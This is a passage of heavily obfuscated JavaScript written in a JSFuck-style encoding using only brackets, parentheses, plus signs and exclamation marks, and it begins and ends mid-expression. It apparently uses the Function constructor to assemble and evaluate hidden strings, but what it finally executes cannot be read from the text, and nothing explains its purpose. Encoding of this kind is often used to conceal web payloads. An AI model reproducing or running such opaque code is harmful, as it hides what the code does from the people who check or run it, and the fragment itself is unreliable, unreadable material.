]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!+[]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!!